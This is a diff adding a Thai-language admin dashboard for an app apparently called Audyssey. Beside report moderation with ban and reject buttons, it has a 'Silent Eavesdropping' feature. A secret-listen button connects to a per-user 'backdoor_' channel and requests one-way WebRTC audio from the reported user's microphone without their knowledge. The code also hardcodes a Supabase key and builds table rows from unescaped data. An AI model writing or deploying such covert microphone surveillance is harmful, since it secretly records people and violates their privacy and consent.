@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="th">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Audyssey Admin - ระบบจัดการหลังบ้าน</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
+        body { background-color: #0a0a0a; color: #fff; padding: 30px; }
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #333; padding-bottom: 20px; margin-bottom: 30px; }
+        .logo { font-size: 28px; font-weight: bold; color: #fff; }
+        
+        table { width: 100%; border-collapse: collapse; background: #111; border-radius: 8px; overflow: hidden; }
+        th, td { padding: 15px; text-align: left; border-bottom: 1px solid #222; font-size: 14px; }
+        th { background: #1a1a1a; color: #aaa; font-weight: 500; }
+        tr:hover { background: #151515; }
+        
+        .badge { padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
+        .badge.pending { background: #ffc107; color: #000; }
+        .badge.banned { background: #dc3545; color: #fff; }
+        .badge.rejected { background: #6c757d; color: #fff; }
+
+        .btn { padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold; transition: 0.2s; margin-right: 5px; }
+        .btn-listen { background: #007bff; color: white; }
+        .btn-listen:hover { background: #0056b3; }
+        .btn-listen.active { background: #28a745; animation: pulse 1.5s infinite; }
+        .btn-ban { background: #dc3545; color: white; }
+        .btn-reject { background: #444; color: white; }
+
+        .listening-panel { background: #004085; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: none; align-items: center; justify-content: space-between; }
+        
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="logo">Audyssey Admin Dashboard</div>
+        <div id="adminStatus">กำลังเชื่อมต่อ...</div>
+    </div>
+
+    <!-- แผงควบคุมการแอบฟัง -->
+    <div id="listenPanel" class="listening-panel">
+        <div>
+            <strong style="font-size: 16px;">🎙️ กำลังดักฟังเสียงผู้ใช้: </strong> 
+            <span id="targetUserIdText"></span>
+        </div>
+        <button class="btn btn-ban" onclick="stopListening()" style="margin: 0;">หยุดดักฟัง</button>
+    </div>
+    <audio id="adminAudio" autoplay></audio>
+
+    <h2>รายงานผู้กระทำผิดล่าสุด</h2>
+    <br>
+    <table>
+        <thead>
+            <tr>
+                <th>เวลาที่รายงาน</th>
+                <th>ผู้ถูกรายงาน (ID)</th>
+                <th>สถานะ</th>
+                <th>การจัดการ</th>
+            </tr>
+        </thead>
+        <tbody id="reportTableBody">
+            <!-- ข้อมูลจะถูกโหลดที่นี่ -->
+        </tbody>
+    </table>
+
+    <script>
+        // ใส่ Key ของคุณ
+        const SUPABASE_URL = 'https://vyvuhwnhgcmbokkshnxo.supabase.co';
+        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InZ5dnVod25oZ2NtYm9ra3NobnhvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODgwMjU1MDIsImV4cCI6MjEwMzYwMTUwMn0.FYzIS30XtiPNaBRxv6VaS6VOG4hRmP1rFljFINwm_do';
+        const sb = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        let adminPc = null;
+        let activeBackdoor = null;
+        const rtcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
+
+        window.onload = async () => {
+            document.getElementById('adminStatus').innerText = 'ออนไลน์ 🟢';
+            loadReports();
+            
+            // รับการแจ้งเตือนเรียลไทม์เมื่อมีคนกดรายงานใหม่
+            sb.channel('public:reports').on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'reports' }, payload => {
+                loadReports();
+            }).subscribe();
+        };
+
+        async function loadReports() {
+            const { data, error } = await sb.from('reports').select('*').order('created_at', { ascending: false });
+            if (error) return console.error(error);
+            
+            const tbody = document.getElementById('reportTableBody');
+            tbody.innerHTML = '';
+            
+            data.forEach(r => {
+                const tr = document.createElement('tr');
+                const date = new Date(r.created_at).toLocaleString('th-TH');
+                const shortId = r.reported_user_id.substring(0, 8) + '...';
+                
+                let statusBadge = `<span class="badge pending">รอดำเนินการ</span>`;
+                if(r.status === 'banned') statusBadge = `<span class="badge banned">ถูกแบนแล้ว</span>`;
+                if(r.status === 'rejected') statusBadge = `<span class="badge rejected">ปฏิเสธคำร้อง</span>`;
+
+                tr.innerHTML = `
+                    <td>${date}</td>
+                    <td>${shortId}</td>
+                    <td>${statusBadge}</td>
+                    <td>
+                        <button class="btn btn-listen" onclick="listenToUser('${r.reported_user_id}')">แอบฟัง 🎧</button>
+                        <button class="btn btn-ban" onclick="banUser('${r.reported_user_id}', '${r.id}')">แบน ⛔</button>
+                        <button class="btn btn-reject" onclick="rejectReport('${r.id}')">ปฏิเสธ ❌</button>
+                    </td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        // ================= ระบบดักฟัง (Silent Eavesdropping) =================
+        async function listenToUser(targetUserId) {
+            stopListening();
+            document.getElementById('listenPanel').style.display = 'flex';
+            document.getElementById('targetUserIdText').innerText = targetUserId;
+
+            adminPc = new RTCPeerConnection(rtcConfig);
+            
+            // เมื่อได้รับเสียงจากเป้าหมาย ให้เล่นออกลำโพงแอดมิน
+            adminPc.ontrack = e => { document.getElementById('adminAudio').srcObject = e.streams[0]; };
+
+            adminPc.onicecandidate = e => {
+                if (e.candidate && activeBackdoor) activeBackdoor.send({ type: 'broadcast', event: 'admin_cmd', payload: { action: 'candidate', candidate: e.candidate, from: 'admin' } });
+            };
+
+            // เชื่อมต่อช่องทางลับของเป้าหมาย
+            activeBackdoor = sb.channel(`backdoor_${targetUserId}`);
+            activeBackdoor.on('broadcast', { event: 'admin_cmd' }, async (msg) => {
+                const data = msg.payload;
+                if (data.action === 'answer') {
+                    await adminPc.setRemoteDescription(data.answer);
+                } else if (data.action === 'candidate' && data.from === 'user') {
+                    adminPc.addIceCandidate(data.candidate);
+                }
+            }).subscribe(async (status) => {
+                if(status === 'SUBSCRIBED') {
+                    // ส่งคำขอฟังเสียง (Offer) ไปให้เป้าหมาย โดยรับเสียงทางเดียว (offerToReceiveAudio: true)
+                    const offer = await adminPc.createOffer({ offerToReceiveAudio: true, offerToReceiveVideo: false });
+                    await adminPc.setLocalDescription(offer);
+                    activeBackdoor.send({ type: 'broadcast', event: 'admin_cmd', payload: { action: 'listen', offer: offer } });
+                }
+            });
+        }
+
+        function stopListening() {
+            if (adminPc) { adminPc.close(); adminPc = null; }
+            if (activeBackdoor) { sb.removeChannel(activeBackdoor); activeBackdoor = null; }
+            document.getElementById('adminAudio').srcObject = null;
+            document.getElementById('listenPanel').style.display = 'none';
+        }
+
+        // ================= ระบบจัดการ =================
+        async function banUser(userId, reportId) {
+            if(!confirm('ยืนยันการแบนผู้ใช้นี้ถาวร?')) return;
+            // 1. อัปเดตตาราง Profile
+            await sb.from('profiles').update({ is_banned: true }).eq('id', userId);
+            // 2. อัปเดตสถานะ Report
+            await sb.from('reports').update({ status: 'banned' }).eq('id', reportId);
+            // 3. เตะออกจากระบบ (ส่งคำสั่งเตะผ่านช่องทางลับ)
+            const kickChannel = sb.channel(`backdoor_${userId}`);
+            kickChannel.subscribe((status) => {
+                if(status === 'SUBSCRIBED') kickChannel.send({ type: 'broadcast', event: 'admin_cmd', payload: { action: 'ban' } });
+            });
+            alert('แบนสำเร็จ!');
+            loadReports();
+        }
+
+        async function rejectReport(reportId) {
+            await sb.from('reports').update({ status: 'rejected' }).eq('id', reportId);
+            loadReports();
+        }
+    </script>
+</body>
+</html>
